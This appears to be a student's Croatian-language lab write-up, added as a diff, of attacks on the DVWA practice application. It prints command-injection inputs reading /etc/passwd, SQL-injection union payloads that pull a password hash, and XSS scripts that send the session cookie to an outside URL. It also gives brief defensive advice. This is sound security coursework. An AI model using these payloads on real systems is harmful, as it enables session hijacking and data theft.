@@ -1,0 +1,77 @@
+1.Command Injection
+Prvo sam pokrenuo jednostavnu naredbu 1 | echo sui da vidim da li ovo može proći.
+Nakon što se sui ispisao vidio sam da web ranjiv te sam napisao sljedeću naredbu 1 | ls /etc -l.
+Ta naredba mi je ispisala sve datoteke pod /etc i dozvole. U tom se ispisu vidi da svatko može čitati iz datoteke passwd.
+Nakon toga sam pokrenuo naredbu 1 | cat /etc/passwd te dobio ispis koji možete vidjeti na slici "Command injection attack".
+
+2. SQL Injection
+Prvo sam htio vidjeti o kojoj se bazi radi zbog sintakse naredbi sql upita te sam izveo sljedeću naredbu:
+
+%' or 0=0 union select null, version() #, kao odgovor sam dobio 10.1.26-MariaDB-0+deb9u1 iz čega se jasno vidi da se radi o MariaDB.
+
+S tom naredbom sam odmah dobio i informaciju da postoji ranjivost na SQL injection.
+
+Sa sljedećom naredbom sam saznao kako se zove baza podataka koja se koristi:
+
+' or 0=0 union select null, database() #
+
+Nakon toga sam htio saznati više o tablicama te sam pokrenuo sljedeću naredbu:
+
+' or 0=0 UNION SELECT  table_name, table_schema FROM information_schema.TABLES  # 
+
+Te sam u ispisu tražio bazu koja se zove dvwa te bih sazno sve tablice iz te baze.
+Rezultat se može vidjeti na slici "SQL Injection - popis tablica unutar dvwa".
+
+
+Nakon toga sam htio doznati podatke o stupcima u određenoj tablici i u trenutnoj bazi te sam pokrenuo sljedeće:
+
+' or 0=0 union select table_name,column_name FROM information_schema.COLUMNS WHERE  table_schema=DATABASE() AND table_name = 'users' #
+
+Rezultat se može vidjeti na slici "SQL Injection - popis stupaca u tablici users i bazi dnwa".
+
+Sa sljedećom naredbom dobivam hash iz tablice:
+
+1' or 0=0 UNION SELECT user_id, password FROM users  WHERE first_name = 'Pablo' and last_name='Picasso'# 
+
+Hash: 0d107d09f5bbe40cade3de5c71e9e9b7
+Lozinka: letmein
+Alat: https://crackstation.net/
+
+3.XSS
+Moja prva naredba:
+ 
+<script>
+	alert("Hello")
+</script> - to sam samo da vidim da li napad može proći i pri ponovnom učitavanju stranice sam dobio bas taj popup
+
+<script>
+	alert(document.cookie)
+</script> - sa ovime sam onda dobio popup koji mi je ispisao cookie stranice.
+
+PHPSESSID=vlma36j1u2dd2q3a36ohj4oab3; security=low
+
+Sad kako bih mogao napisati skriptu koja će proslijediti cookie na drugi URL morao sam promjeniti maxlenght na textarea unutar preglednika te sam onda napisao sljedeći kod.
+
+<script>
+	let cookie = document.cookie;
+	document.location.href='http://public.tel.fer.hr/sui?cookie='+cookie;
+</script>
+
+Ili mozda na ovaj način bez da preusmjerava korisnika:
+
+<script>
+	let cookie = document.cookie;
+	document.write('<img src="http://public.tel.fer.hr/sui?cookie=' + cookie + '" alt="Hello" />');
+</script>
+
+Da bi se zaštitili od ovakvih napada moramo kao prvo onemogućiti da se skripta pokrene,
+odnosno da se skripta ispisuje kao html tekst a ne da ga prepozna kao JavaScript skriptu. To možemo tako da prepoznamo < kao &lt.
+Isto tako možemo raditi provjere kod primanja podataka, te ako nam je nešto sumnjivo to da odbacimo.
+Korištenjem zastavice HTTPOnly kako se preko JavaScripta ne može pristupiti kolačiću.
+
+4. File Inclusion
+
+To je moguće jer smo manipulirali URLom tako da smo promjenili ime datoteke koje želimo da nam prikaže te kad pošaljemo taj novi zahtjev,
+pošto nema validacije na php serveru, on dohvaća tu datoteku te je prikazuje.
+Kako bi se zaštitili od ovakvih napada najbolje bi nam bilo da radimo provjeru pri primanju zahtjeva
+te uz to bi bilo dobro dodijeliti php serveru dati prikladnu rolu kako ne bi mogao pristupati datotekama kojima ne bi smio
